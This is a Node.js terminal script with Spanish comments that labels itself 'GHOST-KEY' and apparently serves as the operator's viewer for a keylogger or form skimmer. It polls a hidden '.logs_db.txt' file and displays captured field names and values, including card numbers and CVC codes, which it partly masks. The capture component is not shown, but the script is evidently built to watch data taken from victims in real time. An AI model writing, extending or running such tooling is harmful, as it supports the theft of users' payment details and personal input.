#!/usr/bin/env node

/**
 * Monitor.js - Herramienta para monitorear logs en tiempo real
 * Muestra los datos capturados de forma visual y ordenada
 */

const fs = require('fs');
const path = require('path');

const LOG_FILE = path.join(__dirname, '.logs_db.txt');

// Colores para la terminal
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
};

function printHeader() {
    console.clear();
    console.log(`\n${colors.bright}${colors.cyan}════════════════════════════════════════════════════════${colors.reset}`);
    console.log(`${colors.bright}${colors.yellow}  👻 MONITOR DE CAPTURA - GHOST-KEY${colors.reset}`);
    console.log(`${colors.bright}${colors.cyan}════════════════════════════════════════════════════════${colors.reset}\n`);
}

function readLogs() {
    if (!fs.existsSync(LOG_FILE)) {
        console.log(`${colors.yellow}⚠️  No hay logs aún. Esperando capturas...${colors.reset}\n`);
        return [];
    }

    try {
        const content = fs.readFileSync(LOG_FILE, 'utf-8');
        const lines = content.trim().split('\n').filter(line => line.length > 0);
        return lines;
    } catch (err) {
        console.error(`${colors.red}❌ Error leyendo logs: ${err.message}${colors.reset}`);
        return [];
    }
}

function displayLogs() {
    const logs = readLogs();
    
    if (logs.length === 0) {
        console.log(`${colors.yellow}⏳ Esperando capturas del usuario...${colors.reset}\n`);
        return;
    }

    console.log(`${colors.green}✅ Total de capturas: ${logs.length}${colors.reset}\n`);

    // Mostrar últimas 20 capturas
    const recentLogs = logs.slice(-20);
    recentLogs.forEach((log, index) => {
        const match = log.match(/\[(.*?)\]\s+Campo:\s+(.*?)\s+\|\s+Valor:\s+(.*)/);
        if (match) {
            const [, timestamp, field, value] = match;
            console.log(`${colors.dim}${index + 1}.${colors.reset} ${colors.cyan}[${timestamp}]${colors.reset}`);
            console.log(`   ${colors.bright}📋 Campo:${colors.reset} ${colors.magenta}${field}${colors.reset}`);
            
            // Enmascarar datos sensibles para la visualización
            let displayValue = value;
            if (field.includes('card') || field.includes('number')) {
                displayValue = value.replace(/\d(?=\d{4})/g, '*');
            }
            if (field.includes('cvc') || field.includes('cvv')) {
                displayValue = '●●●';
            }
            
            console.log(`   ${colors.bright}📝 Valor:${colors.reset} ${colors.green}${displayValue}${colors.reset}\n`);
        }
    });
}

function startMonitoring() {
    printHeader();
    
    console.log(`${colors.yellow}📡 Monitoreando archivo: ${LOG_FILE}${colors.reset}`);
    console.log(`${colors.yellow}⏱️  Actualizando cada 2 segundos...${colors.reset}\n`);

    // Mostrar inicialmente
    displayLogs();

    // Monitorear cambios cada 2 segundos
    let lastSize = 0;
    setInterval(() => {
        if (fs.existsSync(LOG_FILE)) {
            const currentSize = fs.statSync(LOG_FILE).size;
            if (currentSize !== lastSize) {
                lastSize = currentSize;
                printHeader();
                displayLogs();
            }
        }
    }, 2000);
}

// Iniciar monitoreo
startMonitoring();

// Permitir detener con Ctrl+C
process.on('SIGINT', () => {
    console.log(`\n\n${colors.yellow}👋 Cerrando monitor de captura...${colors.reset}\n`);
    process.exit(0);
});
